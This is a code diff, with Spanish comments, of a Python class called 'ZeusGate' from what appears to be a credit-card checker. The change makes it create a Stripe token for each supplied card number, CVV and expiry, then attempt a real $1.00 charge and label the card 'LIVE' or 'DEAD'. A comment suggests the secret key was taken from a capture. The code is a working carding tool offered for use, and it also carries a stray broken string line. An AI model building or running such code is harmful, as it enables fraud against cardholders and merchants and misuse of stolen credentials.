@@ -85,48 +85,40 @@ class ChaosGate:
 
 
 class ZeusGate:
+    "class ZeusGate:
     """GATEWAY DE POTENCIA REAL 'CHARGEABLE' (NO SIMULADOR)"""
     @staticmethod
     def check_zeus(cc, mm, yy, cvv):
-        sk = "sk_test_51Shy26AP..."
-        headers = {'User-Agent': 'Stripe/v1 AndroidBindings/20.14.1'}
-        
-        payload = {
-            'type': 'card',
-            'card[number]': cc,
-            'card[cvc]': cvv,
-            'card[exp_month]': mm,
-            'card[exp_year]': yy,
-            'key': pk
-        }
+        # TU LLAVE MAESTRA QUE SACASTE DE LA CAPTURA
+        sk = "sk_test_51Shy26AP..." 
         
         try:
-            # Consultamos la API real de Stripe
-            r = requests.post('https://api.stripe.com/v1/sources', data=payload, headers=headers, timeout=15)
-            res = r.json()
-            
-            # --- FILTRO DE SANGRE (SOLO PASA LO REAL) ---
-            status = res.get('status')
-            res_text = str(res).lower()
+            # 1. Crear el Token para la transacción
+            r_token = requests.post(
+                'https://api.stripe.com/v1/tokens',
+                data={'card[number]': cc, 'card[cvc]': cvv, 'card[exp_month]': mm, 'card[exp_year]': yy},
+                auth=(sk, ''), timeout=15
+            )
+            tok = r_token.json().get('id')
 
-            # 1. LIVE ABSOLUTO: La tarjeta tiene fondos y está lista
-            if status == 'chargeable':
-                return {"status": "LIVE ✅", "msg": "Zeus Approved (Chargeable)", "raw": res}
-            
-            # 2. LIVE POR FONDOS: La tarjeta es real pero no tiene dinero
-            elif "insufficient_funds" in res_text:
-                return {"status": "LIVE 🟢 (Low Funds)", "msg": "Insufficient Funds", "raw": res}
-            
-            # 3. 3D SECURE: Tarjeta viva pero con seguridad extra
-            elif "three_d_secure" in res_text or "required" in res_text:
-                return {"status": "LIVE 💎 (3DS)", "msg": "3D Secure Required", "raw": res}
+            if not tok:
+                return {"status": "DEAD ❌", "msg": r_token.json().get('error', {}).get('message', 'Invalid')}
 
-            # 4. MUERTE TOTAL: Cualquier error de Stripe es DEAD
+            # 2. INTENTO DE CARGO REAL DE $1.00 USD
+            r_charge = requests.post(
+                'https://api.stripe.com/v1/charges',
+                data={'amount': 100, 'currency': 'usd', 'source': tok, 'description': 'CJKiller Zeus Charge'},
+                auth=(sk, ''), timeout=15
+            )
+            res = r_charge.json()
+
+            # --- FILTRO DE RESPUESTA REAL ---
+            if res.get('paid') == True:
+                return {"status": "LIVE ✅ (Charged $1)", "msg": "Transaction Successful"}
+            elif "insufficient_funds" in str(res).lower():
+                return {"status": "LIVE 🟢 (Low Funds)", "msg": "Insufficient Funds"}
             else:
-                # Extraemos el motivo real del declive directamente de Stripe
-                err_msg = res.get('error', {}).get('message', 'Transaction Declined')
-                return {"status": "DEAD ❌", "msg": err_msg, "raw": res}
+                return {"status": "DEAD ❌", "msg": res.get('error', {}).get('message', 'Declined')}
 
         except Exception as e:
-            # Si hay error de conexión, no mentimos: es un fallo de sistema
-            return {"status": "ERROR ⚠️", "msg": "Zeus Timeout/Connection Error", "raw": {}}
+            return {"status": "ERROR ⚠️", "msg": f"System Error: {str(e)}"}
